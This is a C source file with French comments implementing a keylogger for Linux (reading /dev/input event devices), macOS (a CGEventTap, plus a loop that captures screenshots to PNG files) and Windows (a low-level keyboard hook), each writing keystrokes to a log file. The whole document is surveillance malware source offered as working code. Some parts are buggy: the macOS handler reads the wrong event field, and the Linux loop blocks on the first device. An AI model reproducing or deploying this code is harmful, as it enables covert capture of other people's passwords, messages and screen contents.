#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef __linux__

#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <dirent.h>

// Fonction pour enregistrer les événements de touches sur Linux
void keylogger(const char *file_path) {
    struct dirent *entry;
    DIR *dir = opendir("/dev/input");
    if (!dir) {
        perror("Failed to open /dev/input");
        return;
    }

    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
    if (!logfile) {
        perror("Failed to open log file");
        closedir(dir);
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, "event") != NULL) {
            char device_path[512];
            snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
            int fd = open(device_path, O_RDONLY);
            if (fd == -1) {
                perror("Failed to open input device");
                continue;
            }

            struct input_event ev;
            while (1) {
                ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
                if (bytes == -1) {
                    perror("Failed to read input event");
                    break;
                }
                if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                    fprintf(logfile, "%d : %s\n", ev.code, device_path);
                }
            }
            close(fd);
        }
    }

    fclose(logfile); // Ferme le fichier à la fin
    closedir(dir);
}

#endif

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <CoreGraphics/CoreGraphics.h>
#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

// Gestionnaire d'événements pour macOS
CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userInfo) {
    if (type == kCGEventKeyDown) {
        int keyCode = CGEventGetIntegerValueField(event, kCGEventSourceStateID);
        FILE *logfile = (FILE *)userInfo; // Récupère le fichier passé en argument
        fprintf(logfile, "Key pressed: %d\n", keyCode); // Enregistre la touche dans le fichier
    }
    return event;
}

// Fonction pour démarrer le keylogger sur macOS
void start_keylogger(const char *file_path) {
    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
    if (!logfile) {
        printf("Failed to open log file\n");
        return;
    }

    CFMachPortRef eventTap = CGEventTapCreate(kCGEventTapEventTap, kCGEventTapOptionDefault, kCGEventTapEventTap, kCGEventKeyDown, event_handler, logfile);
    if (!eventTap) {
        printf("Failed to create event tap\n");
        fclose(logfile);
        return;
    }

    CFRunLoopRef runLoop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(runLoop, CFMachPortCreateRunLoopSource(NULL, eventTap, 0), kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();

    fclose(logfile); // Ferme le fichier une fois le keylogger terminé
}

void save_image(CGImageRef image, const char *filename) {
    CFURLRef url = CFURLCreateWithFileSystemPath(NULL, CFStringCreateWithCString(NULL, filename, kCFStringEncodingUTF8), kCFURLPOSIXPathStyle, false);
    CGImageDestinationRef dest = CGImageDestinationCreateWithURL(url, kUTTypePNG, 1, NULL);
    CGImageDestinationAddImage(dest, image, NULL);
    CGImageDestinationFinalize(dest);
    CFRelease(url);
    CFRelease(dest);
}

void capture_screen_at_fps(int target_fps, const char *output_directory) {
    clock_t last_capture_time = clock();
    int target_delay = CLOCKS_PER_SEC / target_fps;
    int image_counter = 0;

    while (1) {
        clock_t current_time = clock();
        int time_diff = current_time - last_capture_time;

        // Si le temps écoulé est plus grand que le délai cible, on capture
        if (time_diff >= target_delay) {
            // Capture de l'écran
            CGImageRef image = CGDisplayCreateImage(kCGDirectMainDisplay);
            if (image != NULL) {
                // Crée un nom de fichier unique basé sur le compteur d'image
                char filename[1024];
                snprintf(filename, sizeof(filename), "%s/screenshot_%d.png", output_directory, image_counter);

                // Sauvegarde l'image dans le dossier spécifié
                save_image(image, filename);
                printf("Image sauvegardée : %s\n", filename);

                CFRelease(image);
                image_counter++; // Incrémenter le compteur d'images
            }

            last_capture_time = current_time; // Réinitialise l'heure de la dernière capture
        }
    }
}

#endif

#ifdef __WIN32__

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>


FILE *logfile = NULL;

// Fonction pour obtenir le timestamp UNIX (secondes depuis 1970)
long get_unix_time() {
    return (long)time(NULL);
}

// Convertit vkCode en caractère lisible (simplifié)
char vkcode_to_char(DWORD vkCode) {
    // Si c'est une lettre majuscule
    if (vkCode >= 0x41 && vkCode <= 0x5A) {
        return (char)vkCode;
    }

    // Si c'est un chiffre
    if (vkCode >= 0x30 && vkCode <= 0x39) {
        return (char)vkCode;
    }

    // Retourne '.' pour les touches non mappées
    return '.';
}

long long get_unix_time_ms() {
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);

    ULARGE_INTEGER ull;
    ull.LowPart = ft.dwLowDateTime;
    ull.HighPart = ft.dwHighDateTime;

    // FILETIME = 100-nanosecond intervals since Jan 1, 1601
    // Convert to milliseconds since Unix epoch (Jan 1, 1970)
    return (ull.QuadPart - 116444736000000000ULL) / 10000;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

        long long unix_time_ms = get_unix_time_ms();  // Utilisation de la version millisecondes
        char c = vkcode_to_char(kbd->vkCode);

        fprintf(logfile, "%lld : %ld (char: %c)\n", unix_time_ms, kbd->vkCode, c);
        fflush(logfile);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


// Lancement du keylogger
void start_keylogger(const char *file_path) {
    logfile = fopen(file_path, "a");
    if (!logfile) {
        printf("Erreur ouverture fichier\n");
        return;
    }

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) {
        printf("Erreur d'installation du hook\n");
        fclose(logfile);
        return;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    fclose(logfile);
}


#endif
